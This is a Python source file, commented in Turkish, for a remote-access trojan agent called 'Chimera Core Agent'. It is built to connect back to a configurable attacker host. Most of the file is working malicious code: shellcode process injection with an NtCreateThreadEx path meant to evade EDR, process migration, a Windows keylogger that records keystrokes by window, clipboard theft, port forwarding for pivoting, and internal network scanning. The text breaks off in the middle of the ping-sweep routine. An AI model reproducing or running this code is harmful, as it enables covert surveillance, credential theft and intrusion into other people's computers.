"""
Chimera Core Agent v0.1
Mah Framework için geliştirilmiş temel reverse TCP ajanı.
Sadece Python 3 standart kütüphaneleri kullanır.
"""
import socket
import subprocess
import os
import sys
import platform
import struct
import time
import ssl
import random
import string
import types
import base64
import threading
import shutil

# ============================================================
# Konfigürasyon - generate.py tarafından doldurulacak
# ============================================================
LHOST = "{{LHOST}}"
LPORT = {{LPORT}}
RECONNECT_DELAY = 5      # Yeniden bağlanma bekleme süresi (saniye)
MAX_RECONNECT = -1        # -1 = sınırsız yeniden bağlanma denemesi



class ProcessInjector:
    """
    Windows ctypes tabanlı Process Injection modülü.
    Shellcode veya DLL'i hedef process'in sanal belleğine enjekte eder.
    Desteklenen teknikler:
      - Classic Injection : VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
      - NtCreateThreadEx  : EDR atlatma amaçlı düşük seviye thread oluşturma
    """

    # Windows sabitleri
    _PROCESS_ALL_ACCESS = 0x1F0FFF
    _MEM_COMMIT         = 0x1000
    _MEM_RESERVE        = 0x2000
    _PAGE_EXECUTE_READWRITE = 0x40
    _MEM_RELEASE        = 0x8000

    def _open_process(self, pid: int):
        """Hedef process'i PROCESS_ALL_ACCESS ile açar.

        Returns:
            HANDLE veya None (hata durumunda)
        """
        if sys.platform != "win32":
            return None
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            handle = kernel32.OpenProcess(
                self._PROCESS_ALL_ACCESS,
                False,
                pid
            )
            return handle if handle else None
        except Exception:
            return None

    def _close_handle(self, handle):
        """Windows HANDLE'ı kapatır."""
        try:
            import ctypes
            ctypes.windll.kernel32.CloseHandle(handle)
        except Exception:
            pass

    def _alloc_and_write(self, kernel32, h_process, shellcode: bytes):
        """Hedef process'e bellek tahsis eder ve shellcode'u yazar.

        Returns:
            (remote_addr, shellcode_len) veya (None, 0)
        """
        import ctypes

        sc_len = len(shellcode)

        # Uzak process'te RWX bellek tahsis et
        remote_addr = kernel32.VirtualAllocEx(
            h_process,
            None,
            sc_len,
            self._MEM_COMMIT | self._MEM_RESERVE,
            self._PAGE_EXECUTE_READWRITE
        )
        if not remote_addr:
            return None, 0

        # Shellcode'u belleğe yaz
        written = ctypes.c_size_t(0)
        sc_buf = (ctypes.c_char * sc_len)(*shellcode)
        ok = kernel32.WriteProcessMemory(
            h_process,
            ctypes.c_void_p(remote_addr),
            sc_buf,
            sc_len,
            ctypes.byref(written)
        )
        if not ok or written.value != sc_len:
            kernel32.VirtualFreeEx(h_process, ctypes.c_void_p(remote_addr), 0, self._MEM_RELEASE)
            return None, 0

        return remote_addr, sc_len

    def inject_shellcode(self, pid: int, shellcode: bytes, use_nt: bool = False) -> str:
        """Shellcode'u hedef process'e enjekte eder ve çalıştırır.

        Args:
            pid      : Hedef process ID.
            shellcode: Ham bayt dizisi (x64 veya x86 shellcode).
            use_nt   : True ise NtCreateThreadEx kullanır (EDR atlatma).

        Returns:
            str: İşlem sonucu.
        """
        if sys.platform != "win32":
            return "[!] Process Injection sadece Windows sistemlerde desteklenmektedir."

        if not shellcode:
            return "[!] Shellcode boş olamaz."

        try:
            import ctypes
            from ctypes import wintypes

            kernel32 = ctypes.windll.kernel32

            # Hedef process'i aç
            h_process = self._open_process(pid)
            if not h_process:
                err = kernel32.GetLastError()
                return f"[!] Process açılamadı (PID: {pid}). Hata kodu: {err}. Yeterli yetkiniz var mı?"

            try:
                remote_addr, sc_len = self._alloc_and_write(kernel32, h_process, shellcode)
                if not remote_addr:
                    err = kernel32.GetLastError()
                    return f"[!] Bellek tahsisi/yazma başarısız (PID: {pid}). Hata kodu: {err}"

                if use_nt:
                    # NtCreateThreadEx yöntemi - daha düşük seviye, bazı hook'ları atlatır
                    result = self._nt_create_thread(h_process, remote_addr)
                else:
                    # Klasik yöntem: CreateRemoteThread
                    result = self._create_remote_thread(kernel32, h_process, remote_addr)

                return result

            finally:
                self._close_handle(h_process)

        except Exception as e:
            return f"[!] Injection hatası: {str(e)}"

    def _create_remote_thread(self, kernel32, h_process, remote_addr) -> str:
        """Klasik CreateRemoteThread yöntemi ile uzak thread oluşturur."""
        import ctypes

        h_thread = kernel32.CreateRemoteThread(
            h_process,
            None,
            0,
            ctypes.c_void_p(remote_addr),
            None,
            0,
            None
        )
        if not h_thread:
            err = kernel32.GetLastError()
            return f"[!] CreateRemoteThread başarısız. Hata kodu: {err}"

        # Thread'in başlamasını kısa süre bekle
        kernel32.WaitForSingleObject(h_thread, 500)
        self._close_handle(h_thread)
        return f"[+] Shellcode enjekte edildi ve çalıştırıldı (CreateRemoteThread). Adres: {hex(remote_addr)}"

    def _nt_create_thread(self, h_process, remote_addr) -> str:
        """NtCreateThreadEx yöntemi ile uzak thread oluşturur (EDR atlatma)."""
        import ctypes

        try:
            ntdll = ctypes.windll.ntdll

            # NtCreateThreadEx prototype
            # NTSTATUS NtCreateThreadEx(
            #   PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess,
            #   PVOID ObjectAttributes, HANDLE ProcessHandle,
            #   PVOID StartRoutine, PVOID Argument,
            #   ULONG CreateFlags, SIZE_T ZeroBits,
            #   SIZE_T StackSize, SIZE_T MaximumStackSize,
            #   PVOID AttributeList)
            ntdll.NtCreateThreadEx.restype  = ctypes.c_ulong  # NTSTATUS
            ntdll.NtCreateThreadEx.argtypes = [
                ctypes.POINTER(ctypes.c_void_p),  # ThreadHandle (out)
                ctypes.c_ulong,                    # DesiredAccess
                ctypes.c_void_p,                   # ObjectAttributes
                ctypes.c_void_p,                   # ProcessHandle
                ctypes.c_void_p,                   # StartRoutine
                ctypes.c_void_p,                   # Argument
                ctypes.c_ulong,                    # CreateFlags
                ctypes.c_size_t,                   # ZeroBits
                ctypes.c_size_t,                   # StackSize
                ctypes.c_size_t,                   # MaximumStackSize
                ctypes.c_void_p,                   # AttributeList
            ]

            h_thread = ctypes.c_void_p(0)
            status = ntdll.NtCreateThreadEx(
                ctypes.byref(h_thread),
                0x1FFFFF,                 # THREAD_ALL_ACCESS
                None,
                ctypes.c_void_p(h_process),
                ctypes.c_void_p(remote_addr),
                None,
                0,                        # CREATE_SUSPENDED yoksa 0
                0,
                0,
                0,
                None
            )

            if status != 0:
                return f"[!] NtCreateThreadEx başarısız. NTSTATUS: {hex(status)}"

            if h_thread.value:
                ctypes.windll.kernel32.WaitForSingleObject(h_thread, 500)
                self._close_handle(h_thread)

            return f"[+] Shellcode enjekte edildi ve çalıştırıldı (NtCreateThreadEx). Adres: {hex(remote_addr)}"

        except AttributeError:
            return "[!] NtCreateThreadEx bu sistemde kullanılamıyor, CreateRemoteThread kullanın."
        except Exception as e:
            return f"[!] NtCreateThreadEx hatası: {str(e)}"

    def migrate(self, target_pid: int, current_shellcode_path: str = None) -> str:
        """Mevcut agent'ı başka bir process'e migrate eder.

        Mevcut agent'ı (kendini) hedef process'e taşır:
        1. Mevcut process belleğindeki agent kodunu alır.
        2. Hedef process'e basit bir loader shellcode enjekte eder.

        NOT: Bu fonksiyon pratik bir yardımcıdır. Gerçek migration
        için shellcode, agent payload'ının derlenmiş halini içermelidir.
        Bu implementasyonda hedef process'e bildirim yapılır ve
        seçenekler önerilir (gerçek shellcode handler tarafından sağlanmalıdır).

        Args:
            target_pid           : Hedef process PID.
            current_shellcode_path: Enjekte edilecek shellcode dosyası yolu (opsiyonel).

        Returns:
            str: İşlem sonucu.
        """
        if sys.platform != "win32":
            return "[!] Process Migration sadece Windows sistemlerde desteklenmektedir."

        try:
            import ctypes

            kernel32 = ctypes.windll.kernel32

            # Hedef process'in var olup olmadığını kontrol et
            h_process = self._open_process(target_pid)
            if not h_process:
                err = kernel32.GetLastError()
                return (
                    f"[!] Hedef process açılamadı (PID: {target_pid}). "
                    f"Hata kodu: {err}. Process çalışıyor mu ve yetkiniz var mı?"
                )
            self._close_handle(h_process)

            # Shellcode dosyası verilmişse enjekte et
            if current_shellcode_path:
                if not os.path.exists(current_shellcode_path):
                    return f"[!] Shellcode dosyası bulunamadı: {current_shellcode_path}"

                with open(current_shellcode_path, "rb") as f:
                    shellcode = f.read()

                result = self.inject_shellcode(target_pid, shellcode)
                if "[+]" in result:
                    return (
                        f"[+] Migration tamamlandı! Agent, PID {target_pid} içine taşındı.\n"
                        f"    Detay: {result}\n"
                        f"    Mevcut process (PID: {os.getpid()}) sonlandırılabilir."
                    )
                return f"[!] Migration başarısız: {result}"

            # Shellcode yoksa bilgi ver
            current_pid  = os.getpid()
            current_arch = "x64" if struct.calcsize("P") * 8 == 64 else "x86"

            info_lines = [
                f"[*] Process Migration Hazır",
                f"    Mevcut Agent PID : {current_pid}",
                f"    Hedef PID        : {target_pid}",
                f"    Mimari           : {current_arch}",
                f"    Durum            : Hedef process erişilebilir.",
                "",
                f"[*] Kullanım:",
                f"    inject_shellcode <PID> <HEX_SHELLCODE>   -- Shellcode enjekte et",
                f"    inject_migrate   <PID> <SHELLCODE_HEX>   -- Shellcode ile migrate et",
            ]
            return "\n".join(info_lines)

        except Exception as e:
            return f"[!] Migration hatası: {str(e)}"

    def list_injectable_processes(self) -> str:
        """Enjeksiyona uygun process'leri listeler.

        Düşük yetkili, inject için uygun process'leri filtreler.

        Returns:
            str: Formatlanmış process listesi.
        """
        if sys.platform != "win32":
            return "[!] Bu komut sadece Windows sistemlerde desteklenmektedir."

        try:
            import ctypes
            from ctypes import wintypes

            kernel32 = ctypes.windll.kernel32

            # CreateToolhelp32Snapshot ile process listesi al
            TH32CS_SNAPPROCESS = 0x00000002

            class PROCESSENTRY32(ctypes.Structure):
                _fields_ = [
                    ("dwSize",              wintypes.DWORD),
                    ("cntUsage",            wintypes.DWORD),
                    ("th32ProcessID",       wintypes.DWORD),
                    ("th32DefaultHeapID",   ctypes.POINTER(ctypes.c_ulong)),
                    ("th32ModuleID",        wintypes.DWORD),
                    ("cntThreads",          wintypes.DWORD),
                    ("th32ParentProcessID", wintypes.DWORD),
                    ("pcPriClassBase",      ctypes.c_long),
                    ("dwFlags",             wintypes.DWORD),
                    ("szExeFile",           ctypes.c_char * 260),
                ]

            h_snap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
            if h_snap == ctypes.c_void_p(-1).value:
                return "[!] Process snapshot alınamadı."

            try:
                pe32 = PROCESSENTRY32()
                pe32.dwSize = ctypes.sizeof(PROCESSENTRY32)

                # Güvenli (enjeksiyona uygun) process'leri filtrele
                safe_processes = [
                    "explorer.exe", "notepad.exe", "mspaint.exe",
                    "calc.exe",     "wordpad.exe",  "msiexec.exe",
                    "svchost.exe",  "rundll32.exe", "dllhost.exe",
                    "conhost.exe",  "taskhost.exe", "taskhostw.exe",
                ]

                injectable = []
                current_pid = os.getpid()

                if kernel32.Process32First(h_snap, ctypes.byref(pe32)):
                    while True:
                        exe_name = pe32.szExeFile.decode("cp1254", errors="ignore").lower()
                        pid      = pe32.th32ProcessID

                        if pid != current_pid and exe_name in safe_processes:
                            # Handle açarak erişim kontrolü yap
                            h_test = kernel32.OpenProcess(0x400, False, pid)  # PROCESS_QUERY_INFORMATION
                            if h_test:
                                self._close_handle(h_test)
                                injectable.append((pid, exe_name, pe32.cntThreads))

                        if not kernel32.Process32Next(h_snap, ctypes.byref(pe32)):
                            break

            finally:
                self._close_handle(h_snap)

            if not injectable:
                return "[-] Enjeksiyona uygun erişilebilir process bulunamadı."

            lines = [
                "=" * 55,
                "  ENJEKSİYONA UYGUN PROCESS'LER",
                "=" * 55,
                f"  {'PID':<8} {'İSİM':<25} {'THREAD'}" ,
                f"  {'-'*7} {'-'*24} {'-'*6}",
            ]
            for pid, name, threads in injectable:
                lines.append(f"  {pid:<8} {name:<25} {threads}")
            lines.append("=" * 55)
            lines.append(f"  Toplam: {len(injectable)} process")
            return "\n".join(lines)

        except Exception as e:
            return f"[!] Process listeleme hatası: {str(e)}"


class Keylogger:
    """
    Windows için Ctypes tabanlı Keylogger.
    Arka planda (Thread) çalışır ve tuş vuruşlarını kaydeder.
    """
    def __init__(self):
        self.running = False
        self.logs = []
        self.thread = None
        self.hook = None
        
        # Windows API Sabitleri ve Yapıları
        if sys.platform == "win32":
            import ctypes
            from ctypes import windll, CFUNCTYPE, POINTER, c_int, c_void_p, byref
            from ctypes.wintypes import DWORD, LPARAM, WPARAM, MSG
            
            self.user32 = windll.user32
            self.kernel32 = windll.kernel32
            
            self.WH_KEYBOARD_LL = 13
            self.WM_KEYDOWN = 0x0100
            self.WM_SYSKEYDOWN = 0x0104
            
            # Hook callback tipi
            # LRESULT callback(int nCode, WPARAM wParam, LPARAM lParam)
            self.HOOKPROC = CFUNCTYPE(c_int, c_int, WPARAM, LPARAM)
            
            # KBDLLHOOKSTRUCT
            class KBDLLHOOKSTRUCT(ctypes.Structure):
                _fields_ = [
                    ("vkCode", DWORD),
                    ("scanCode", DWORD),
                    ("flags", DWORD),
                    ("time", DWORD),
                    ("dwExtraInfo", c_void_p)
                ]
            self.KBDLLHOOKSTRUCT = KBDLLHOOKSTRUCT
            
    def _get_key_name(self, vk_code):
        """Virtual Key Code'u okunabilir karaktere çevirir."""
        # Özel tuşlar haritası
        special_keys = {
            8: "[BACKSPACE]", 9: "[TAB]", 13: "[ENTER]", 27: "[ESC]",
            32: " ", 160: "[LSHIFT]", 161: "[RSHIFT]", 
            162: "[LCTRL]", 163: "[RCTRL]", 164: "[LALT]", 165: "[RALT]",
            20: "[CAPS]", 46: "[DEL]", 37: "[LEFT]", 38: "[UP]", 
            39: "[RIGHT]", 40: "[DOWN]", 91: "[WIN]", 92: "[WIN]"
        }
        
        if vk_code in special_keys:
            return special_keys[vk_code]
        
        # Standart karakterler
        try:
            # Klavye düzenini al
            keyboard_layout = self.user32.GetKeyboardLayout(0)
            
            # Karakter bufferı
            import ctypes
            buff = ctypes.create_unicode_buffer(16)
            
            # Tuş durumunu al (Shift, Caps Lock vb. için)
            keys_state = (ctypes.c_byte * 256)()
            self.user32.GetKeyboardState(ctypes.byref(keys_state))
            
            # ToUnicodeEx ile çevir
            ret = self.user32.ToUnicodeEx(vk_code, 0, keys_state, buff, len(buff), 0, keyboard_layout)
            
            if ret > 0:
                char = buff.value
                # Basılamayan karakterleri filtrele
                if not char.isprintable():
                    return f"[UNK:{vk_code}]"
                return char
        except:
            pass
            
        # Fallback: ASCII/Chr
        if 32 < vk_code < 127:
            return chr(vk_code)
        return f"[{vk_code}]"

    def _hook_proc(self, nCode, wParam, lParam):
        """Windows Hook Callback Fonksiyonu."""
        if nCode >= 0 and (wParam == self.WM_KEYDOWN or wParam == self.WM_SYSKEYDOWN):
            import ctypes
            # lParam aslında KBDLLHOOKSTRUCT pointer'ı
            kb_struct = ctypes.cast(lParam, ctypes.POINTER(self.KBDLLHOOKSTRUCT)).contents
            
            try:
                key_name = self._get_key_name(kb_struct.vkCode)
                
                # Pencere başlığını al
                active_window_title = self._get_active_window_title()
                
                # Log formatı: [Pencere] Tuş
                timestamp = time.strftime("%H:%M:%S")
                log_entry = f"[{timestamp}] {active_window_title} -> {key_name}"
                
                # Basitçe tuşları birleştir (daha okunaklı olması için)
                # Eğer son log aynı penceredeyse sadece tuşu ekle
                if self.logs and self.logs[-1]['window'] == active_window_title:
                    self.logs[-1]['keys'] += key_name
                else:
                    self.logs.append({
                        'timestamp': timestamp,
                        'window': active_window_title,
                        'keys': key_name
                    })
                    
            except Exception as e:
                pass
                
        # Zincirdeki bir sonraki hook'a pasla
        return self.user32.CallNextHookEx(self.hook, nCode, wParam, lParam)

    def _get_active_window_title(self):
        """Aktif pencere başlığını alır."""
        try:
            hwnd = self.user32.GetForegroundWindow()
            length = self.user32.GetWindowTextLengthW(hwnd)
            import ctypes
            buff = ctypes.create_unicode_buffer(length + 1)
            self.user32.GetWindowTextW(hwnd, buff, length + 1)
            return buff.value if buff.value else "Unknown Window"
        except:
            return "Unknown"

    def _start_impl(self):
        """Keylogger thread fonksiyonu."""
        import ctypes
        from ctypes import byref
        from ctypes.wintypes import MSG
        
        # Callback'i sakla (GC tarafından silinmemesi için)
        self.callback = self.HOOKPROC(self._hook_proc)
        
        # Hook kur (WH_KEYBOARD_LL = 13)
        # GetModuleHandle(None) -> Current modules handle
        h_mod = self.kernel32.GetModuleHandleW(None)
        
        self.hook = self.user32.SetWindowsHookExA(
            self.WH_KEYBOARD_LL, 
            self.callback, 
            h_mod, 
            0
        )
        
        if not self.hook:
            return
            
        # Mesaj döngüsü (Message Pump)
        msg = MSG()
        while self.running:
            # PeekMessage non-blocking, GetMessage blocking
            # GetMessage kullanırsak thread'i durduramayız (PostQuitMessage gerekir)
            # O yüzden PeekMessage + sleep kullanabiliriz veya GetMessage kullanıp
            # durdururken PostThreadMessage atarız.
            # Basitlik için GetMessage kullanalım.
            
            # Thread durdurma kontrolü için PeekMessage daha güvenli
            if self.user32.PeekMessageW(byref(msg), 0, 0, 0, 1): # PM_REMOVE = 1
                self.user32.TranslateMessage(byref(msg))
                self.user32.DispatchMessageW(byref(msg))
            else:
                time.sleep(0.01)

        # Döngü bitti, hook'u kaldır
        self.user32.UnhookWindowsHookEx(self.hook)
        self.hook = None

    def start(self):
        """Keylogger'ı başlatır."""
        if self.running or sys.platform != "win32":
            return False
            
        self.running = True
        self.logs = [] # Logları temizle
        self.thread = threading.Thread(target=self._start_impl, daemon=True)
        self.thread.start()
        return True

    def stop(self):
        """Keylogger'ı durdurur."""
        if not self.running:
            return False
        
        self.running = False
        if self.thread:
            self.thread.join(timeout=1)
            self.thread = None
        return True

    def dump(self):
        """Biriken logları döner ve temizler."""
        if not self.logs:
            return "Log yok."
            
        output = []
        output.append("-" * 40)
        output.append(f"KEYLOGGER DUMP ({len(self.logs)} Entries)")
        output.append("-" * 40)
        
        for entry in self.logs:
            output.append(f"[{entry['timestamp']}] [{entry['window']}]")
            output.append(f"{entry['keys']}")
            output.append("")
            
        self.logs = [] # Okunanları sil
        return "\n".join(output)

class ClipboardManager:
    """
    Platform bağımsız panoya erişim yöneticisi.
    Windows (ctypes), macOS (pbcopy/pbpaste), Linux (xclip/xsel).
    """
    def get_text(self):
        """Panodaki metni okur."""
        if sys.platform == "win32":
            try:
                import ctypes
                from ctypes import windll, c_char_p, c_wchar_p
                
                user32 = windll.user32
                kernel32 = windll.kernel32
                
                if not user32.OpenClipboard(None):
                    return "[!] Pano açılamadı (Meşgul olabilir)."
                
                try:
                    # CF_UNICODETEXT = 13
                    h_data = user32.GetClipboardData(13)
                    if not h_data:
                        # CF_TEXT = 1 (ASCII fallback)
                        h_data = user32.GetClipboardData(1)
                        if not h_data:
                            return "[!] Pano boş veya metin içermiyor."
                    
                    p_text = kernel32.GlobalLock(h_data)
                    if not p_text:
                        return "[!] Veri kilitlenemedi."
                        
                    try:
                        text = ctypes.c_wchar_p(p_text).value
                    except:
                        text = ctypes.c_char_p(p_text).value.decode('cp1254', errors='ignore')
                        
                finally:
                    kernel32.GlobalUnlock(h_data)
                    user32.CloseClipboard()
                
                return text
            except Exception as e:
                return f"[!] Pano okuma hatası: {str(e)}"
                
        elif sys.platform == "darwin":
            try:
                return subprocess.check_output("pbpaste", shell=True).decode('utf-8')
            except:
                return "[!] pbpaste komutu çalışmadı."
                
        else: # Linux
            try:
                # xclip veya xsel dene
                try:
                    return subprocess.check_output("xclip -o -selection clipboard", shell=True, stderr=subprocess.DEVNULL).decode('utf-8')
                except:
                    return subprocess.check_output("xsel -o -b", shell=True, stderr=subprocess.DEVNULL).decode('utf-8')
            except:
                return "[!] Linux panosuna erişilemedi (xclip/xsel yüklü mü?)."

    def set_text(self, text):
        """Panoya metin yazar."""
        if sys.platform == "win32":
            try:
                import ctypes
                from ctypes import windll, c_size_t
                
                user32 = windll.user32
                kernel32 = windll.kernel32
                
                if not user32.OpenClipboard(None):
                    return False
                
                try:
                    user32.EmptyClipboard()
                    
                    # Metni belleğe hazırla
                    text_bytes = text.encode('utf-16le') + b'\x00\x00'
                    alloc_size = len(text_bytes)
                    
                    # GHND = 0x0042 (GMEM_MOVEABLE | GMEM_ZEROINIT)
                    h_mem = kernel32.GlobalAlloc(0x0042, alloc_size)
                    p_mem = kernel32.GlobalLock(h_mem)
                    
                    ctypes.memmove(p_mem, text_bytes, alloc_size)
                    kernel32.GlobalUnlock(h_mem)
                    
                    # CF_UNICODETEXT = 13
                    if not user32.SetClipboardData(13, h_mem):
                         return False
                finally:
                    user32.CloseClipboard()
                return True
            except:
                return False
                
        elif sys.platform == "darwin":
            try:
                p = subprocess.Popen("pbcopy", stdin=subprocess.PIPE, shell=True)
                p.communicate(input=text.encode('utf-8'))
                return p.returncode == 0
            except:
                return False
                
        else: # Linux
            try:
                # xclip
                p = subprocess.Popen("xclip -selection clipboard", stdin=subprocess.PIPE, shell=True)
                p.communicate(input=text.encode('utf-8'))
                if p.returncode == 0: return True
            except:
                pass
                
            try:
                # xsel fallback
                p = subprocess.Popen("xsel -b -i", stdin=subprocess.PIPE, shell=True)
                p.communicate(input=text.encode('utf-8'))
                return p.returncode == 0
            except:
                return False

# ============================================================
# Port Forwarding (Tünelleme) Modülü
# ============================================================
class PortForwarder:
    """Agent tarafında port forwarding (tünel) yöneticisi.
    
    Local Port Forwarding mantığı:
    - Agent üzerinde bir dinleyici soket açılır (bind_host:bind_port).
    - Handler'dan "portfwd add" komutu geldiğinde agent yerel ağındaki hedef
      adrese (remote_host:remote_port) bir tünel oluşturur.
    - Gelen her bağlantı için iki yönlü (bidirectional) relay thread'leri başlatılır.
    """

    def __init__(self):
        self._tunnels = {}      # id -> {"thread", "server_sock", "stop_event", "info"}
        self._next_id = 1
        self._lock = threading.Lock()

    # ----------------------------------------------------------
    def add(self, bind_host: str, bind_port: int,
            remote_host: str, remote_port: int) -> str:
        """Yeni bir port forwarding tüneli başlatır."""
        try:
            server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_sock.bind((bind_host, bind_port))
            server_sock.listen(5)
            server_sock.settimeout(1.0)   # accept() timeout (stop kontrolü için)
        except Exception as e:
            return f"[!] Port forwarding başlatılamadı ({bind_host}:{bind_port}): {e}"

        stop_event = threading.Event()
        tunnel_id = self._next_id

        def _relay(src: socket.socket, dst: socket.socket, ev: threading.Event):
            """İki soket arasında tek yönlü veri aktarır."""
            try:
                while not ev.is_set():
                    try:
                        src.settimeout(1.0)
                        data = src.recv(4096)
                        if not data:
                            break
                        dst.sendall(data)
                    except socket.timeout:
                        continue
                    except Exception:
                        break
            finally:
                try: src.close()
                except: pass
                try: dst.close()
                except: pass

        def _accept_loop():
            """Gelen bağlantıları kabul eder ve relay thread'lerini oluşturur."""
            while not stop_event.is_set():
                try:
                    client_conn, _ = server_sock.accept()
                except socket.timeout:
                    continue
                except Exception:
                    break

                # Hedef adrese bağlan
                try:
                    remote_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    remote_sock.settimeout(10)
                    remote_sock.connect((remote_host, remote_port))
                except Exception:
                    try: client_conn.close()
                    except: pass
                    continue

                # Çift yönlü relay
                t1 = threading.Thread(target=_relay, args=(client_conn, remote_sock, stop_event), daemon=True)
                t2 = threading.Thread(target=_relay, args=(remote_sock, client_conn, stop_event), daemon=True)
                t1.start()
                t2.start()

            # Temizlik
            try: server_sock.close()
            except: pass

        t = threading.Thread(target=_accept_loop, daemon=True)
        t.start()

        info = {
            "thread": t,
            "server_sock": server_sock,
            "stop_event": stop_event,
            "info": f"{bind_host}:{bind_port} -> {remote_host}:{remote_port}",
        }

        with self._lock:
            self._tunnels[tunnel_id] = info
            self._next_id += 1

        return (
            f"[+] Port forwarding başlatıldı (ID {tunnel_id}): "
            f"{bind_host}:{bind_port} → {remote_host}:{remote_port}"
        )

    # ----------------------------------------------------------
    def remove(self, tunnel_id: int) -> str:
        """Belirtilen ID'ye sahip tüneli durdurur ve temizler."""
        with self._lock:
            if tunnel_id not in self._tunnels:
                return f"[!] Tünel #{tunnel_id} bulunamadı."
            tunnel = self._tunnels.pop(tunnel_id)

        tunnel["stop_event"].set()
        try: tunnel["server_sock"].close()
        except: pass
        return f"[+] Port forwarding #{tunnel_id} kaldırıldı."

    # ----------------------------------------------------------
    def list_tunnels(self) -> str:
        """Aktif tünelleri listeler."""
        with self._lock:
            if not self._tunnels:
                return "[-] Aktif port forwarding tüneli yok."
            lines = ["[*] Aktif Port Forwarding Tünelleri:"]
            lines.append(f"  {'ID':<6}{'Tünel':<40}{'Durum':<10}")
            lines.append("  " + "-" * 54)
            for tid, t in self._tunnels.items():
                status = "Aktif" if t["thread"].is_alive() else "Durduruldu"
                lines.append(f"  {tid:<6}{t['info']:<40}{status:<10}")
            return "\n".join(lines)

    # ----------------------------------------------------------
    def stop_all(self) -> str:
        """Tüm tünelleri durdurur."""
        with self._lock:
            ids = list(self._tunnels.keys())
        if not ids:
            return "[-] Aktif tünel yok."
        for tid in ids:
            self.remove(tid)
        return f"[+] {len(ids)} tünel durduruldu."


# ============================================================
# Network Scanner (Ağ Tarama) Modülü
# ============================================================
class NetworkScanner:
    """İç ağ keşfi için düz tarayıcı.

    Desteklenen tarama türleri:
      - Ping Sweep  : ICMP/TCP ile aktif host tespiti.
      - ARP Scan    : Layer 2 ARP tablosu ile cihaz keşfi.
      - Port Scan   : TCP connect ile port taraması (aralık bazlı).

    Tüm taramalar multi-threaded çalışır; ek kütüphane gerektirmez.
    """

    # ── Yardımcı: CIDR → IP listesi ─────────────────────────────
    @staticmethod
    def _cidr_to_ips(cidr: str) -> list:
        """CIDR notasyonunu IP listesine çevirir.

        Desteklenen formatlar:
          - 192.168.1.0/24
          - 10.0.0.0/16  (büyük ağlarda 1024 host ile sınırlanır)
          - 192.168.1.1   (tek IP)
        """
        if "/" not in cidr:
            return [cidr]

        parts = cidr.split("/")
        base_ip = parts[0]
        try:
            prefix = int(parts[1])
        except ValueError:
            return [base_ip]

        octets = list(map(int, base_ip.split(".")))
        ip_int = (octets[0] << 24) | (octets[1] << 16) | (octets[2] << 8) | octets[3]

        mask = (0xFFFFFFFF << (32 - prefix)) & 0xFFFFFFFF
        network = ip_int & mask
        broadcast = network | (~mask & 0xFFFFFFFF)

        # Güvenlik: çok büyük ağları sınırla
        host_count = broadcast - network - 1
        if host_count > 1024:
            broadcast = network + 1025

        ips = []
        for addr in range(network + 1, broadcast):
            ips.append(
                f"{(addr >> 24) & 0xFF}."
                f"{(addr >> 16) & 0xFF}."
                f"{(addr >> 8) & 0xFF}."
                f"{addr & 0xFF}"
            )
        return ips

    # ── Yardımcı: Port aralığı parse ────────────────────────────
    @staticmethod
    def _parse_ports(port_str: str) -> list:
        """Port string'ini listeye çevirir.

        Desteklenen formatlar:
          - '80'          → [80]
          - '22,80,443'   → [22, 80, 443]
          - '1-1024'      → [1, 2, ..., 1024]
          - '22,80,100-200,443' → karışık
        """
        ports = []
        for part in port_str.split(","):
            part = part.strip()
            if "-" in part:
                try:
                    start, end = part.split("-", 1)
                    start, end = int(start), int(end)
                    if start > end:
                        start, end = end, start
                    # Güvenlik: tek seferde en fazla 10000 port
                    if (end - start) > 10000:
                        end = start + 10000
                    ports.extend(range(start, end + 1))
                except ValueError:
                    pass
            else:
                try:
                    ports.append(int(part))
                except ValueError:
                    pass
        return sorted(set(ports))

    # ── Tek IP Ping (subprocess) ─────────────────────────────────
    @staticmethod
    def _ping_host(ip: str, timeout: int = 1) -> bool:
        """ICMP ping ile host erişilebilirliğini kontrol eder."""
        try:
            param = "-n" if sys.platform == "win32" else "-c"
            t_param = "-w" if sys.platform == "win32" else "-W"
            t_val = str(timeout * 1000) if sys.platform == "win32" else str(timeout)

            startupinfo = None
            if sys.platform == "win32":
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = 0

            result = subprocess.run(
                ["ping", param, "1", t_param, t_val, ip],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                startupinfo=startupinfo,
                timeout=timeout + 2,
            )
            return result.returncode == 0
        except Exception:
            return False

    # ── TCP Connect ile host keşfi ──────────────────────────────
    @staticmethod
    def _tcp_probe(ip: str, port: int = 445, timeout: float = 0.5) -> bool:
        """TCP connect ile hostun ayakta olup olmadığını kontrol eder."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            result = s.connect_ex((ip, port))
            s.close()
            return result == 0 or result in (111, 10061)
        except Exception:
            return False

    # ── Ping Sweep ──────────────────────────────────────────────
    def ping_sweep(self, cidr: str, timeout: int = 1, max_threads: int = 50) -> str:
        """CIDR bloğundaki aktif hostları tespit eder.

        Önce ICMP ping dener, cevap gelmezse TCP/445 probe yapar.

        Args:
            cidr       : Hedef ağ (örn: 192.168.1.0/24)
            timeout    : Ping timeout (saniye)
            max_threads: Eş zamanlı thread sayısı

        Returns:
            str: Formatlanmış sonuç
        """
        ips = self._cidr_to_ips(cidr)
        alive = []
        lock = threading.Lock()

        def _worker(ip):
            if self._ping_host(ip, timeout):
                with lock:
                    alive.append((ip, "ICMP"))
            elif self._tcp_probe(ip):
                with lock:
                    alive.append((ip, "TCP"))

        threads = []
        for ip in ips:
            while len([t for t in threads if t.is_alive()]) >= max_threads:
                time.sleep(0.05)
            t = threading.Thread(target=_worker, args=(ip,), daemon=True)
            t.start()
            threads.append(t)

        for t in threads:
            t.join(timeout=timeout + 5)

        if not alive:
            return f"[-] Ping Sweep: {cidr} → Aktif host bulunamadı ({len(ips)} IP tarandı)."

        alive.sort(key=lambda x: list(map(int, x[0].split("."))))
        output = f"[+] Ping Sweep: {cidr} — {len(alive)}/{len(ips)} host aktif\n"
        output += "-" * 35 + "\n"
        for i, (ip, method) in enumerate(alive, 1):
            output += f"  {i:3d}. {ip:<16s} ({method})\n"
